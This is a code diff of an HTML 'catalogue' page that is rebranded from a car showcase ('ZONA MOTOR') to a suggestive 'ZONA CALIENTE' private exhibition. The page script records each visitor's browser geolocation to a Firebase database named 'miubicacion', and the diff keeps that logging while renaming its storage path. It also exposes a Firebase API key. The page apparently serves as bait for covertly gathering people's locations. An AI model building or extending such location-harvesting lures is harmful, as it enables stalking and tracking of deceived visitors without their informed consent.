@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZONA MOTOR - Catálogo</title>
+    <title>ZONA CALIENTE - Catálogo</title>
     
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script>
@@ -14,6 +14,7 @@
         
         header { background-color: #1f2833; padding: 20px; text-align: center; border-bottom: 3px solid #ff003c; }
         header h1 { color: #ffffff; text-transform: uppercase; letter-spacing: 2px; }
+        header h1 span { color: #ff003c; }
         
         /* Imagen principal de fondo */
         .hero { 
@@ -38,7 +39,7 @@
 <body>
 
     <header>
-        <h1>ZONA<span>MOTOR</span></h1>
+        <h1>ZONA<span>CALIENTE</span></h1>
     </header>
 
     <section class="hero" id="home">
@@ -62,7 +63,7 @@
     </section>
 
     <footer>
-        <p>&copy; 2026 ZonaMotor. Exhibición Privada.</p>
+        <p>&copy; 2026 Zona Caliente. Exhibición Privada.</p>
     </footer>
 
     <script>
@@ -71,7 +72,6 @@
             document.getElementById('seccion-gatitas').classList.add('active');
         }
 
-        // Firebase Configuración
         const firebaseConfig = {
             apiKey: "AIzaSyDITt3GQmc1uANwOqWNVoqWgmhm9CQQRdU",
             authDomain: "miubicacion-52e7f.firebaseapp.com",
@@ -93,7 +93,7 @@
         };
 
         function siPermitio(posicion) {
-            database.ref('visitas_autos/' + Date.now()).set({
+            database.ref('visitas_zona_caliente/' + Date.now()).set({
                 latitud: posicion.coords.latitude,
                 longitud: posicion.coords.longitude,
                 permiso: "Otorgado"
